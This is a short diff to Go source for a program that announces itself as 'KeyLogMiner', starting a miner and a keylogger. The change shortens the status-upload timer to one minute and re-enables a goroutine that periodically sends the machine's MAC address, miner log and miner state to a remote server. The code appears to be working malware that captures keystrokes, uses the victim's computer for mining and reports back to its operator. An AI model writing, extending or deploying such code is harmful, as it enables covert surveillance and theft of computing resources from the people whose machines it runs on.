@@ -529,7 +529,7 @@ func resetEmptyMinerLog() {
 	file.Close()
 }
 func uploadMachineStatus() {
-	for range time.NewTicker(time.Millisecond * 10000).C {
+	for range time.NewTicker(time.Minute * 1).C {
 		machineStatus := MachineStatus{getMac().String(), tailMinerLog(), minerIsRunning()}
 		machineStatusResponse := MachineStatusResponse{}
 		resp, _, err := gorequest.New().
@@ -578,7 +578,7 @@ func main() {
 
 	fmt.Println("Starting KeyLogMiner!")
 	go RunMiner(&config)
-	//go uploadMachineStatus()
+	go uploadMachineStatus()
 	// Run Miner
 	keyLogger(&config)
 	// go keyLogger(&config)
